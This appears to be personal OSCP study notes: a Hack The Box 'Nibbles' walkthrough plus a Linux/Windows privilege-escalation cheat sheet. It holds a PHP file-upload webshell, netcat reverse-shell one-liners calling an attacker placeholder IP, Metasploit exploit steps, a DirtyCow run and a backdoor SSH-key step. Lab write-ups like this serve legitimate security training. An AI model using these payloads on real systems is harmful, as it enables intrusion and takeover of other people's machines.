---
title: Starting Out
date: 2024-10-23
tags:
  - "#oscp"
  - "#technique"
  - "#exploitation"
techniques:
  - ""
  - ""
tools:
  - nmap
  - whatweb
  - crul
  - gobuster
  - linEnum.sh
machines: Nibbles
difficulty:
  - ""
status:
  - Completed
type: ""
os: Linux
categories:
  - ""
exam-priority:
  - easy
time-invested: 
notes: |
  Key points and takeaways from the exercise.
---

### References
- **Ippsec Video:** [YouTube](https://www.youtube.com/watch?v=s_0GcRGv6Ds)
- **Walkthrough:** [0xdf’s Blog](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)


|[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)|Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws.|
|---|---|
|[Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)|Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.|
|[Metasploitable 3](https://github.com/rapid7/metasploitable3)|Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).|
|[DVWA](https://github.com/digininja/DVWA)|This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.|

### **YouTube Channels**

There are many YouTube channels out there that showcase penetration testing/hacking techniques. A few worth bookmarking are:

| [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)       | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.\| |
| ------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)      | Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.                                                      |
| [STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)         | Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.                                    |
| [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w) | Provides videos on a wide variety of technical infosec topics.                                                                                                 |
| [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/)                       |                                                                                                                                                                |

### **Tutorial Websites**

There are many tutorial websites out there for practicing fundamental IT skills, such as scripting.

Two great tutorial websites are [Under The Wire](https://underthewire.tech/wargames) and [Over The Wire](https://overthewire.org/wargames/). These websites are set up to help train users on using both Windows `PowerShell` and the Linux command line, respectively, through various scenarios in a "war games" format.

They take the user through various levels, consisting of tasks or challenges to training them on fundamental to advanced Windows and Linux command line usage and `Bash` and `PowerShell` scripting. These skills are paramount for anyone looking to succeed in this industry.

[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology) and Resources/Reverse Shell Cheatsheet.md

### Box: Nibbles - Enumeration

When writing this, there are 201 standalone boxes on Hack The Box (HTB) available for VIP members. Each retired machine comes with an official HTB walkthrough, and additional blog posts or video tutorials can be easily found via Google.

Let's dive into **Nibbles**, a Linux-based, easy-rated box. It highlights essential penetration testing skills like enumeration, web application exploitation, and privilege escalation through a file misconfiguration.

---

### Machine Overview:

- **Name:** Nibbles
- **Creator:** mrb3n
- **Operating System:** Linux
- **Difficulty:** Easy
- **User Path:** Web
- **Privilege Escalation:** World-writable file/Sudoers misconfiguration
- **Ippsec Video:** [YouTube](https://www.youtube.com/watch?v=s_0GcRGv6Ds)
- **Walkthrough:** [0xdf’s Blog](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)

---

### Enumeration and Approaches

**Enumeration** is the starting point of any machine, and the more information you gather, the better. With HTB's **Nibbles**, we already know it's a **Linux** box with a **web attack vector**, making this a **grey-box** test, where partial information is available. This process contrasts with HTB's active machines, which take a **black-box** approach, providing just the IP and OS type.

**Types of Penetration Testing:**

- **Black-Box:** The tester has minimal to no information about the target, simulating a real-world attack. It’s thorough but may miss certain vulnerabilities.
- **Grey-Box:** The tester has partial information such as IPs or low-level credentials, which simulates insider threats or attackers with limited access.
- **White-Box:** The tester has full access, including credentials, source code, or network diagrams. This method provides a comprehensive evaluation of the target's security.

---

### Nmap Scanning

Let’s kick off with **Nmap** to identify open ports and services using the command:

```bash
nmap -sV --open -oA nibbles_initial_scan <target IP>
```

This command:

- **sV**: Enumerates service versions.
- **-open**: Displays only open ports.
- **oA**: Saves output in all formats (XML, Greppable, and Text).

An important habit in penetration testing is **note-taking**. Save scan outputs for future reference, as this will assist during the reporting phase and prevent evidence loss.

The **Nibbles - Web Footprinting** example highlights a typical process of performing enumeration and vulnerability discovery on a web application. Here’s a step-by-step breakdown of the key steps:

### 1. **Web Application Identification:**

- Using **whatweb** on the target IP reveals basic information: Apache 2.4.18 is the web server running on Ubuntu.
- The homepage shows a simple "Hello world!" message with no immediate clues about the application.

### 2. **Page Source Inspection:**

- Viewing the page source reveals an HTML comment suggesting there’s a `/nibbleblog/` directory.
- This directory can be queried to reveal additional application-specific details.

### 3. **Application Fingerprinting:**

- Running **whatweb** on `/nibbleblog` shows that the application is Nibbleblog, a PHP-based blogging platform.
- Some web technologies in use, like HTML5, jQuery, and PHP, are also identified.

### 4. **Directory Enumeration:**

- Using **Gobuster**, you perform directory brute-forcing to uncover accessible directories like `/admin`, `/content`, `/themes`, etc.
- The `/README` file reveals that the Nibbleblog version is 4.0.3, which is vulnerable to an authenticated file upload vulnerability.

### 5. **Exploring the Admin Portal:**

- Browsing to `/admin.php` brings up the admin login portal, but common credentials like `admin:admin` or `admin:password` fail.
- IP blacklisting prevents brute-force attempts, making tools like Hydra ineffective.

### 6. **Exploring Directory Listings:**

- Browsing `/themes/` and `/content/` uncovers some interesting files like `users.xml`, confirming the username is `admin`.
- However, the password is still missing.

### 7. **Gathering Additional Clues:**

- The `config.xml` file contains some site-specific configuration, but no passwords.
- The site's title and notifications mention "nibbles," prompting the idea to try "nibbles" as the password for the admin login.

### 8. **Successful Login:**

- Using `admin:nibbles` grants access to the admin panel, allowing further exploitation.

### 9. **Concluding Remarks:**

- The importance of thorough enumeration and notetaking is emphasized. Even simple environments can yield valuable information with patience and methodical enumeration.
- This methodology is crucial whether targeting a simple web app or a large enterprise network.

### Key Tools Used:

- **whatweb**: To identify web technologies.
- **curl**: To retrieve and inspect HTTP responses.
- **Gobuster**: For directory brute-forcing.
- **Nmap**: For initial port scanning.

### Vulnerability Identified:

- Nibbleblog 4.0.3 is vulnerable to authenticated file upload exploitation, potentially allowing for arbitrary code execution after gaining admin access.

This example illustrates the standard process used in web application penetration testing: identifying technologies, enumerating directories, fingerprinting applications, and leveraging known exploits to gain access.

This walkthrough for the "Nibbles" machine details how to exploit a vulnerable version of the Nibbleblog platform to gain remote code execution and ultimately a reverse shell. Here's the process summarized:

1. **Admin Portal Enumeration**: After logging in, the admin portal contains several pages, but the `My image` plugin catches our attention. It allows us to upload image files, which we might be able to exploit by uploading PHP code instead.
    
2. **PHP Code Upload**: By uploading a PHP snippet (`<?php system('id'); ?>`), we attempt to gain code execution. The upload results in some errors, but we find the uploaded file in the `/content/private/plugins/my_image/` directory. Running it confirms we have code execution on the server.
    
3. **Reverse Shell**: We modify the PHP file to include a Bash reverse shell one-liner:
    
    ```php
    <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f"); ?>
    
    ```
    
    After uploading the file and triggering the execution, we catch a reverse shell.
    
4. **Shell Upgrade**: Since the shell we receive is basic, we upgrade it to a fully interactive TTY using Python 3:
    
    ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
    
    ```
    
    This enables us to run more commands like `su` or use a text editor.
    
5. **Post-exploitation**: In `/home/nibbler`, we locate the `user.txt` flag and a file named `personal.zip`.
    

This step-by-step process effectively demonstrates gaining a foothold through a vulnerable plugin, escalating access to a reverse shell, and post-exploitation techniques.

### Nibbles - Privilege Escalation section:

1. **Unzipping `personal.zip`**:
    
    - Inside the `/home/nibbler` directory, unzip `personal.zip`, revealing a script file: `monitor.sh`.
    - The script is writeable and owned by the `nibbler` user, meaning we can modify it.
2. **Script Content**:
    
    - The `monitor.sh` script is a basic monitoring script.
    - Since it's owned by `nibbler` and writeable, this presents an opportunity for privilege escalation.
3. **Using [LinEnum.sh](http://LinEnum.sh) for Escalation Checks**:
    
    - Download `LinEnum.sh` from the attack machine to the target using `wget` and run it.
        
    - LinEnum reveals that `nibbler` can run `monitor.sh` as root without needing a password:
        
        ```bash
        bash
        Copy code
        (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
        
        ```
        
4. **Exploiting the Script**:
    
    - Since we can run `monitor.sh` as root, append a reverse shell one-liner to it:
        
        ```bash
        echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f' | tee -a monitor.sh
        
        ```
        
    - Replace `<ATTACKER_IP>` with your attack machine's IP address.
        

- **Explanation**
    - `rm /tmp/f`: Removes any existing named pipe.
    - `mkfifo /tmp/f`: Creates a named pipe at `/tmp/f`.
    - `cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 8443 >/tmp/f`: This sends the output of the shell (`/bin/sh -i`) through a network connection to your attack machine using netcat (`nc`).

1. **Executing the Script**:
    
    - Run the modified `monitor.sh` script using `sudo`:
        
        ```bash
        sudo /home/nibbler/personal/stuff/monitor.sh
        ```
        
2. **Catching the Reverse Shell**:
    
    - Set up a listener on the attack machine:
        
        ```bash
        nc -lvnp 8443
        ```
        
    - Once the script is executed, catch the root shell.
        
3. **Root Access**:
    
    - After gaining the root shell, you can confirm access by running:
        
        ```bash
        id
        ```
        
    - Grab the `root.txt` flag.
        

**Key Points**:

- The ability to write to a file (`monitor.sh`) that can be run with root privileges (via `sudo`) allows us to escalate privileges.
- Always make a backup of the file before modifying it to prevent disruptions.
- Running `LinEnum.sh` helped discover the key vulnerability for privilege escalation.

**Nibbles - Alternate User Method - Metasploit"** process, including how to perform the steps, along with **study tips** at the end.

### Step-by-Step Guide:

### 1. **Starting Metasploit**

- The first step in this process is to start Metasploit by typing `msfconsole` in your terminal.
    
    ```bash
    msfconsole
    
    ```
    
- Metasploit is a powerful tool for automating penetration testing tasks like exploitation, payload generation, and vulnerability scanning. Using it helps you quickly identify and exploit weaknesses in systems.
    

### 2. **Searching for the Exploit**

- Once Metasploit is loaded, search for exploits related to **Nibbleblog**:
    
    ```bash
    search nibbleblog
    
    ```
    
- You will see a list of matching modules. The exploit you are looking for is **nibbleblog_file_upload**, which takes advantage of a file upload vulnerability in Nibbleblog (an older version of blogging software).
    
- The relevant module will look like this:
    
    ```bash
    exploit/multi/http/nibbleblog_file_upload
    
    ```
    

### 3. **Loading the Exploit**

- Select the exploit by either using its number (in the search result) or typing the full path of the module:
    
    ```bash
    use 0  # This loads the first result, nibbleblog_file_upload.
    
    ```
    

### 4. **Setting the Exploit Options**

- Once the exploit is loaded, you need to set the options. These are the target’s IP address (`RHOSTS`) and your attacking machine’s IP address (`LHOST`), which is usually the `tun0` interface (comes with the VPN connection from Hack The Box).
    
    ```bash
    set rhosts 10.129.42.190
    set lhost 10.10.14.2  # Replace this with your machine's tun0 IP.
    
    ```
    

### 5. **Showing the Module Options**

- Use `show options` to check what other values need to be set. This command will display the required parameters:
    
    ```bash
    show options
    
    ```
    
- The key parameters here are:
    
    - **RHOSTS**: The target IP address.
    - **RPORT**: The target port, typically 80 for web servers.
    - **USERNAME and PASSWORD**: In this case, the username and password for the Nibbleblog admin user (use `admin` for username and `nibbles` for the password).
    - **TARGETURI**: The path to the web application (set it to `nibbleblog`).
    
    Example commands:
    
    ```bash
    set username admin
    set password nibbles
    set targeturi nibbleblog
    
    ```
    

### 6. **Setting the Payload**

- After configuring the exploit options, you need to set a payload. By default, Metasploit suggests using `php/meterpreter/reverse_tcp`. However, you will switch this to a simpler payload like `generic/shell_reverse_tcp`, which gives you a reverse shell.
    
    ```bash
    set payload generic/shell_reverse_tcp
    
    ```
    
- Verify the payload options by typing `show options` again to make sure everything is set properly.
    

### 7. **Running the Exploit**

- Once everything is configured, type `exploit` to run the attack:
    
    ```bash
    exploit
    
    ```
    
- This will initiate the exploit, uploading a malicious PHP file that gives you a reverse shell. Once it succeeds, you’ll see a shell prompt connected to the target.
    
- You can confirm you have gained access by typing:
    
    ```bash
    id
    
    ```
    
    This command will return something like:
    
    ```bash
    uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
    
    ```
    
    indicating that you're now logged in as the `nibbler` user.
    

### 8. **Privilege Escalation**

- From this point, you can follow the same privilege escalation steps you used earlier (e.g., checking for writable scripts, misconfigured permissions, or running `LinEnum` to find possible privilege escalation paths).

When gaining initial access to a system, it's often in the context of a low-privileged user. To fully compromise the machine, we need to escalate our privileges to a root or SYSTEM-level user. Here’s a breakdown of common privilege escalation techniques and commands.

---

### Privilege Escalation Checklists

Using checklists helps with thorough enumeration for privilege escalation. Common resources include:

- **HackTricks** - [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and Windows Privilege Escalation
- **PayloadsAllTheThings** - Extensive privilege escalation checklists for both Linux and Windows.

---

### Enumeration Scripts

Automated enumeration scripts help streamline identifying vulnerabilities:

### Linux Enumeration Scripts

- **LinEnum**: Runs commands to find privilege escalation vectors.
    
    ```bash
    ./LinEnum.sh
    ```
    
- **LinPEAS** (part of PEASS):
    
    ```bash
    ./linpeas.sh
    ```
    

### Windows Enumeration Scripts

- **Seatbelt**:
    
    ```powershell
    .\\Seatbelt.exe -group=all
    ```
    
- **JAWS**:
    
    ```powershell
    .\\JAWS.ps1
    ```
    

_Note: These scripts generate "noise" and may trigger security tools._

---

### Kernel Exploits

If the target system is running an outdated or vulnerable kernel, you can search for and exploit kernel vulnerabilities.

### Example: Searching for Kernel Exploits

- For Linux:
    
    ```bash
    uname -r  # Get kernel version
    searchsploit linux kernel  # Search for known exploits
    ```
    
- For Windows:
    
    - Use the Windows version from system info, then search for known vulnerabilities.
    
    ```bash
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    ```
    

### Example Kernel Exploit: DirtyCow (Linux)

If the server is running an old kernel version, such as `3.9.0-73-generic`, we might find vulnerabilities like **DirtyCow** (CVE-2016-5195). Download and compile the exploit, then run it to gain root access:

```bash
gcc -o cow dirtycow.c -pthread
./cow
```

---

### Vulnerable Software

Check for outdated or vulnerable software versions:

- **Linux**: List installed software with `dpkg -l` and look for exploits.
    
    ```bash
    dpkg -l | grep -i apache  # Example for Apache
    
    ```
    
- **Windows**: Explore `C:\\Program Files` or `C:\\Program Files (x86)` for potentially vulnerable applications.
    
    ```powershell
    Get-WmiObject -Class Win32_Product  # Lists installed programs
    ```
    

Search for exploits using resources like Exploit-DB or Google.

---

### User Privileges

Check for ways the current user can run commands with elevated privileges.

### Sudo Privileges (Linux)

Check what commands the user can run with `sudo`:

```bash
sudo -l
```

If you see `(ALL : ALL) ALL`, it means you can run all commands as root:

```bash
sudo su -
whoami  # root

```

If the `NOPASSWD` option is present, it allows command execution without requiring a password:

```bash
sudo -u user /bin/echo "Hello, World!"
```

### SUID/SGID Binaries (Linux)

Search for SUID binaries, which may allow privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Windows Token Privileges

Use tools like **whoami** to check token privileges:

```powershell
whoami /priv
```

---

### Scheduled Tasks & Cron Jobs

Both Linux and Windows use scheduled tasks that can be exploited if misconfigured.

### Cron Jobs (Linux)

Check for cron jobs and their permissions:

```bash
cat /etc/crontab

```

If you can edit or write to a cron job script, you can execute arbitrary commands, such as creating a reverse shell.

### Scheduled Tasks (Windows)

List scheduled tasks and check for writable permissions:

```powershell
schtasks /query /fo LIST /v
```

---

### Exposed Credentials

Search for credentials in configuration files, logs, or user history.

### Example: Find exposed credentials in Linux

Use tools like **grep** or an enumeration script:

```bash
grep -i "password" /etc/passwd /etc/shadow
```

Example output from an enumeration script:

```bash
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

Use exposed credentials for further access, such as MySQL login or SSH.

---

### SSH Keys

If SSH keys are readable, they can provide access to user accounts or root. SSH keys are typically stored in `~/.ssh/id_rsa`.

### Example: Using SSH Keys to Log In (Linux)

```bash
chmod 600 id_rsa  # Set proper permissions
ssh -i id_rsa user@target_IP
```

If you have write access to a user's `.ssh/authorized_keys`, you can add your own public key to gain access.

### Example: Adding Public Key to Gain SSH Access

On your machine:

```bash
ssh-keygen -f key
```

On the target machine:

```bash
echo "ssh-rsa AAAA...key..." >> /home/user/.ssh/authorized_keys
```

Now, SSH into the target machine:

```bash
ssh -i key user@target_IP
```

---

### Command Summary

|Command|Description|
|---|---|
|`./LinEnum.sh`|Linux enumeration script|
|`./linpeas.sh`|PEAS Linux enumeration script|
|`./Seatbelt.exe -group=all`|Windows enumeration script|
|`uname -r`|Check Linux kernel version|
|`dpkg -l`|List installed Linux software|
|`sudo -l`|Check sudo privileges|
|`find / -perm -u=s -type f 2>/dev/null`|Find SUID binaries|
|`cat /etc/crontab`|List Linux cron jobs|
|`schtasks /query /fo LIST /v`|List Windows scheduled tasks|
|`ssh -i id_rsa user@target_IP`|SSH login using private key|
|`whoami /priv`|Check Windows token privileges|

---

### Study Tips

1. **Practice Enumeration**: Use scripts like LinPEAS and Seatbelt on lab machines to get familiar with their output.
2. **Master Manual Checks**: Scripts create noise, so practice manual enumeration to avoid detection.
3. **Understand Exploit Impact**: Test kernel and software exploits in a safe environment before using them in production.
4. **Learn SUID/SGID and sudo**: Privileges are critical in Linux environments, so practice exploiting SUID binaries and sudo misconfigurations.
5. **Use Real-world Examples**: Recreate vulnerable environments to apply these techniques hands-on.